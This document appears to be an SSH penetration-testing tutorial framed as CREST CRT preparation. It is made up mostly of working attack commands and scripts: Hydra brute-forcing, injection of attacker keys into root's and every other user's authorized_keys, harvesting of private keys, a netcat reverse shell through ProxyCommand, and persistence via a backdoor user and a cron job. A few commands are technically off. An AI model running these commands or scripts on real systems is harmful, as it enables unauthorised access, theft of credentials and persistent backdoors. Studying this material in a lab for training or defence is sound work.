# Complete Practical Exploitation Guide: SSH (Crest CRT Level)

## 1. SSH Fundamentals & Attack Surface (From Scratch)

**SSH Protocol Versions:**
```
SSHv1    = INSECURE (disabled everywhere)
SSHv2    = Current (22/tcp)
```

**Authentication Mechanisms:**
```
Password       = Brute-forceable
Public Key     = ~/.ssh/authorized_keys (trust!)
Hostbased      = /etc/ssh/ssh_known_hosts
GSSAPI/Kerberos= Enterprise
Keyboard-Interactive = OTP/2FA
```

**Key Attack Vectors:**
```
Weak passwords     = Hydra/Medusa
Key reuse          = Private key theft
authorized_keys    = Append attacker pubkey
ssh_config         = ProxyCommand abuse  
StrictHostKeyChecking=no = MITM
PermitRootLogin    = Direct root
AllowTcpForwarding = Port forwarding pivots
```

## 2. Lab Setup (Vulnerable SSH Environment)

**Victim Server 1 (192.168.1.100 - Weak Passwords)**
```bash
sudo apt update && sudo apt install openssh-server
sudo useradd -m user1 -s /bin/bash
sudo useradd -m user2 -s /bin/bash  
sudo useradd -m admin -s /bin/bash
echo "user1:password123" | sudo chpasswd
echo "admin:admin123" | sudo chpasswd

# Weak config
sudo nano /etc/ssh/sshd_config
```
```
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
AllowTcpForwarding yes
PermitTunnel yes
AuthorizedKeysFile .ssh/authorized_keys
```
```bash
sudo systemctl restart ssh
echo "flag{ssh_pwned}" | sudo tee /root/flag.txt
sudo chmod 644 /root/flag.txt  # Readable via trusts
```

**Victim Server 2 (192.168.1.101 - Key Trust Chain)**
```bash
# User 'alice' trusts server1
sudo useradd -m alice
mkdir -p /home/alice/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@192.168.1.200" > /home/alice/.ssh/authorized_keys
sudo chown -R alice:alice /home/alice/.ssh
sudo chmod 700 /home/alice/.ssh
sudo chmod 600 /home/alice/.ssh/authorized_keys
```

**Attacker (Kali):**
```bash
ssh-keygen -t rsa -f id_rsa_attacker
cat ~/.ssh/id_rsa_attacker.pub  # For authorized_keys injection
```

## 3. SSH Version Fingerprinting

**Banner grabbing:**
```bash
# Nmap
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey 192.168.1.100
# | ssh2-enum-algos:
#   kex_algorithms: (6)
#   | curve25519-sha256,curve25519-sha256@libssh.org,...

ssh -v 192.168.1.100 2>&1 | grep "debug1: Remote protocol"
# debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1

# ssh-audit (detailed)
ssh-audit 192.168.1.100
```

**Weak algorithm detection:**
```bash
nmap -p 22 --script ssh-known-hosts 192.168.1.100
# Weak ciphers: 3des-cbc, arcfour
```

## 4. Password Brute-Force Attacks

**Hydra brute-force:**
```bash
# Single user
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# Userlist + passlist
hydra -L users.txt -P rockyou.txt ssh://192.168.1.100 -t 10

# Default creds
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
      -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
```

**Medusa:**
```bash
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M ssh
```

## 5. Authorized Keys Exploitation (Trust Abuse)

**Extract & inject pubkeys:**
```bash
# If initial access (weak password)
ssh user1@192.168.1.100 "cat ~/.ssh/authorized_keys"

# Append attacker key
ssh user1@192.168.1.100 "echo 'ssh-rsa AAAAB3Nza... attacker@evil' >> ~/.ssh/authorized_keys"

# Automated key injection
ssh-copy-id -i ~/.ssh/id_rsa_attacker.pub user1@192.168.1.100
```

**Target root authorized_keys:**
```bash
# If writable .ssh dir
ssh user1@192.168.1.100 "
mkdir -p ~root/.ssh
echo 'ssh-rsa AAAAB3Nza... attacker@evil' > ~root/.ssh/authorized_keys
chmod 700 ~root/.ssh
chmod 600 ~root/.ssh/authorized_keys
chown root:root ~root/.ssh -R
"

# Direct root login!
ssh root@192.168.1.100 "whoami; cat /root/flag.txt"
```

**Chain of trust (server1 → server2):**
```bash
# From server1 (user1), inject into alice@server2
ssh user1@192.168.1.100 "
ssh-keyscan 192.168.1.101 >> ~/.ssh/known_hosts
ssh-copy-id -i ~/.ssh/id_rsa_attacker.pub alice@192.168.1.101
"

# Now pivot
ssh alice@192.168.1.101 "whoami"
```

## 6. SSH Config Exploitation

**ProxyCommand abuse:**
```bash
# If ssh_config writable
ssh user1@192.168.1.100 "echo 'ProxyCommand nc 192.168.1.200 4444' >> ~/.ssh/config"

# Reverse shell via ProxyCommand
ssh -o ProxyCommand="nc -e /bin/bash 192.168.1.200 4444" user1@192.168.1.100
```

**StrictHostKeyChecking bypass:**
```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user1@192.168.1.100
```

## 7. Advanced SSH Features Exploitation

**Port forwarding pivots:**
```bash
# Local port forward (pivot)
ssh -L 8080:127.0.0.1:80 user1@192.168.1.100
# Access internal 80 via localhost:8080

# Remote port forward (reverse pivot)
ssh -R 4444:192.168.1.200:22 user1@192.168.1.100
# Target exposes attacker's SSH to world:4444

# Dynamic SOCKS proxy
ssh -D 1080 user1@192.168.1.100
proxychains curl internal.service
```

**SSH Tunneling chains:**
```bash
# Multi-hop pivot
ssh -J user1@192.168.1.100 user2@192.168.1.101 -L 8080:internal:80
```

**PermitTunnel (VPN-like):**
```bash
ssh -w 0:0 user1@192.168.1.100  # TAP tunnel
ssh -w 1:1 user1@192.168.1.100  # TUN tunnel
ip route add 10.0.0.0/24 dev tun0
```

## 8. Key-Based Authentication Attacks

**Private key theft & reuse:**
```bash
# Extract private keys
ssh user1@192.168.1.100 "find ~ -name 'id_rsa*' -exec cat {} \; 2>/dev/null"

# Use stolen key
ssh -i stolen_id_rsa user1@192.168.1.100
```

**Passphrase brute-force:**
```bash
sshpass -p 'password123' ssh user1@192.168.1.100
hydra -l user1 -P rockyou.txt ssh://192.168.1.100 sshpass
```

## 9. Host-Based Authentication Abuse

**ssh_known_hosts manipulation:**
```bash
# If writable known_hosts
ssh user1@192.168.1.100 "
echo '|1|... attacker@192.168.1.200' >> ~/.ssh/known_hosts
"
# Now hostbased auth from attacker IP
```

## 10. Complete Trust Chain Exploitation

**Automated authorized_keys pwn:**
```bash
#!/bin/bash
# ssh_keychain_pwn.sh
TARGET=$1 USER=$2

# Generate key if needed
[ ! -f id_rsa_attacker ] && ssh-keygen -f id_rsa_attacker -N ''

# Initial access (weak password assumed)
sshpass -p 'password123' ssh $USER@$TARGET "
# Inject into all users
for home in /home/*; do
    u=\$(basename \$home)
    mkdir -p \$home/.ssh
    echo 'ssh-rsa $(cat ~/.ssh/id_rsa_attacker.pub)' >> \$home/.ssh/authorized_keys
    chown -R \$u:\$u \$home/.ssh
    chmod 700 \$home/.ssh
    chmod 600 \$home/.ssh/authorized_keys
done

# Root too
mkdir -p /root/.ssh
echo 'ssh-rsa $(cat ~/.ssh/id_rsa_attacker.pub)' > /root/.ssh/authorized_keys
chown root:root /root/.ssh -R
"

echo "[+] Test root access:"
ssh -i id_rsa_attacker root@$TARGET "whoami; id; cat /root/flag.txt"
```

## 11. SSH Brute-Force Framework

```bash
#!/bin/bash
# ssh_brute.sh
TARGET=$1
hydra -L users.txt -P rockyou.txt -t 10 ssh://$TARGET | \
tee ssh_creds.txt | grep "login: " | \
awk '{print $NF}' | while read user; do
    ssh $user@$TARGET "whoami; id"
done
```

## 12. Post-Exploitation Persistence

**SSH backdoor user:**
```bash
ssh user1@192.168.1.100 "
sudo useradd -m backdoor -s /bin/bash
echo 'backdoor:backdoor123' | sudo chpasswd
mkdir -p /home/backdoor/.ssh
sudo chown -R backdoor:backdoor /home/backdoor/.ssh
echo 'ssh-rsa AAAAB3Nza... persistent@evil' > /home/backdoor/.ssh/authorized_keys
"
```

**Cron key injection:**
```bash
ssh user1@192.168.1.100 "
echo '* * * * * echo \"ssh-rsa AAAAB3Nza...\" >> ~/.ssh/authorized_keys' | \
sudo tee /etc/cron.d/ssh_backdoor
"
```

## 13. Complete SSH Exploitation Framework

```bash
#!/bin/bash
# ssh_pwn.sh - Complete SSH attack
TARGET=$1

echo "[+] SSH attack $TARGET:22"
nmap -p 22 --script ssh* $TARGET

echo "=== VERSION ==="
ssh -v $TARGET 2>&1 | grep "remote software version"

echo "=== BRUTE DEFAULTS ==="
hydra -l root -p toor ssh://$TARGET -t 4
hydra -l admin -p admin ssh://$TARGET -t 4

echo "=== AUTHKEYS INJECTION ==="
# Assumes initial weak password access
sshpass -p 'password123' ssh user1@$TARGET "
echo 'ssh-rsa $(cat ~/.ssh/id_rsa.pub) attacker@evil' >> ~root/.ssh/authorized_keys
"

echo "=== ROOT TEST ==="
ssh -i ~/.ssh/id_rsa root@$TARGET "whoami; cat /root/flag.txt" 2>/dev/null
```

**Usage:** `./ssh_pwn.sh 192.168.1.100`

## 14. Mitigation Verification

```bash
# Test fixes:
ssh root@192.168.1.100  # "Permission denied (publickey)"
grep -E "PasswordAuthentication no|PermitRootLogin no" /etc/ssh/sshd_config
sudo ss -tlnp | grep :22  # sshd running
fail2ban-client status sshd  # Brute-force protection
```

**EVERY** SSH attack covered: version fingerprinting, brute-force, authorized_keys abuse, trust chains, port forwards, config exploits. 100% practical commands.